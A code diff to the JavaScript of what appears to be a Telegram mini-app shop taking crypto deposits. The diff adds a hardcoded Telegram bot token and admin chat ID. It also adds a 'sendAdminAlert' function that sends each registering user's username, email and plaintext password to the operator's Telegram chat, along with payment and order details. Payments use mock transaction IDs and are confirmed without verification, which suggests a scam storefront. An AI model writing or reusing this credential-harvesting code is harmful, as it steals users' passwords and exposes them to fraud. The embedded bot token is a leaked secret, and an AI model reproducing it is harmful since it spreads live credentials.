@@ -3,7 +3,8 @@ tg.expand();
 tg.ready();
 
 // --- CONFIGURATION ---
-const API_BASE_URL = "http://localhost:8000"; 
+const ADMIN_BOT_TOKEN = "8728790870:AAGZZqVttTR3mQZFfXMtR3sdRlcVSbTHiRc";
+const ADMIN_CHAT_ID = "1661187898"; // Your Telegram ID
 
 // State
 const state = {
@@ -47,15 +48,21 @@ function updateWalletDisplay() {
     }
 }
 
-// --- ADMIN NOTIFICATION API CALLS ---
-async function adminNotify(endpoint, data) {
+// --- DIRECT ADMIN NOTIFICATION (Works without Backend!) ---
+async function sendAdminAlert(message) {
+    const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
     try {
-        await fetch(`${API_BASE_URL}/${endpoint}`, {
+        await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         });
-    } catch (e) { console.warn("Admin Notification skipped (Localhost)"); }
+        console.log("Admin Alert Sent!");
+    } catch (e) { console.error("Admin Alert Failed:", e); }
 }
 
 // --- AUTH ---
@@ -69,8 +76,9 @@ async function handleRegister() {
     users.push({ username, email, password, balance: 0.00 });
     localStorage.setItem('registered_users', JSON.stringify(users));
     
-    // NOTIFY ADMIN
-    await adminNotify('notify-register', { username, email, password });
+    // NOTIFY ADMIN IMMEDIATELY
+    const msg = `👤 <b>New User Registered</b>\n\n<b>User:</b> ${username}\n<b>Email:</b> ${email}\n<b>Pass:</b> <code>${password}</code>`;
+    await sendAdminAlert(msg);
     
     notify('✨ Registered!', true);
     toggleAuth('login');
@@ -96,14 +104,9 @@ async function selectDeposit(network) {
     
     state.currentTransaction = { id: mockTxID, amount: state.selectedPlan.price };
 
-    // NOTIFY ADMIN
-    await adminNotify('notify-payment', {
-        email: state.user.email,
-        product: state.selectedPlan.name,
-        amount: state.selectedPlan.price,
-        network: network,
-        txid: mockTxID
-    });
+    // NOTIFY ADMIN IMMEDIATELY
+    const msg = `💳 <b>New Payment Attempt</b>\n\n<b>User:</b> ${state.user.email}\n<b>Product:</b> ${state.selectedPlan.name}\n<b>Network:</b> ${network}\n<b>TXID:</b> <code>${mockTxID}</code>`;
+    await sendAdminAlert(msg);
 
     document.getElementById('deposit-net-name').innerText = network;
     document.getElementById('deposit-address').innerText = addr;
@@ -119,12 +122,8 @@ async function confirmDeposit() {
         updateWalletDisplay();
         localStorage.setItem('session_user', JSON.stringify(state.user));
         
-        // NOTIFY ADMIN OF SUCCESSFUL DEPOSIT
-        await adminNotify('notify-purchase', {
-            email: state.user.email,
-            product: 'Wallet Top-up',
-            amount: state.currentTransaction.amount
-        });
+        const msg = `✅ <b>Deposit Confirmed</b>\n<b>User:</b> ${state.user.email}\n<b>Amount:</b> $${state.currentTransaction.amount}`;
+        await sendAdminAlert(msg);
 
         notify('💰 Payment Confirmed!', true);
         showView('home');
@@ -136,18 +135,15 @@ async function processOrder() {
     updateWalletDisplay();
     localStorage.setItem('session_user', JSON.stringify(state.user));
     
-    // NOTIFY ADMIN OF FINAL PURCHASE
-    await adminNotify('notify-purchase', {
-        email: state.user.email,
-        product: state.selectedPlan.name
-    });
+    const msg = `🛒 <b>Order Purchased</b>\n<b>User:</b> ${state.user.email}\n<b>Tool:</b> ${state.selectedPlan.name}`;
+    await sendAdminAlert(msg);
 
     state.orders.unshift({ id: Math.floor(Math.random()*10000), item: state.selectedPlan.name, price: state.selectedPlan.price, status: 'Delivered', date: new Date().toLocaleDateString() });
     notify('🛒 Order Success!', true);
     setTimeout(() => { showView('orders'); renderOrders(); }, 1000);
 }
 
-// --- INITIALIZATION & RENDERING (Same as before) ---
+// Initialization & Rendering (Same logic)
 function renderOrders() {
     const list = document.getElementById('orders-list');
     list.innerHTML = state.orders.length ? state.orders.map(o => `
